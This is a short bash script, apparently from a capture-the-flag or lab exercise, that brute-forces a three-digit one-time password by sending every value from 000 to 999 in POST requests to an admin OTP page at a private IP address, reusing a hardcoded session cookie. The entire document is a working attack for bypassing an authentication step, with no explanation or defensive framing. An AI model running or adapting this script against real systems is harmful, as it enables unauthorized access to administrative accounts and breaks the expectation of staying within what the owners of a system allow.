#!/bin/bash
PHPSESSID="468f1c1b84943cd11c5edf82f2fd57af"
for ((i=0; i<=999; i++))
do
    OTP=$(printf "%03d" $i)
    curl -X POST "http://192.168.1.80:1337/admin/otp.php" \
    -b "PHPSESSID=${PHPSESSID}" \
    -d "OTP=${OTP}"
    echo "OTP=$OTP"
done







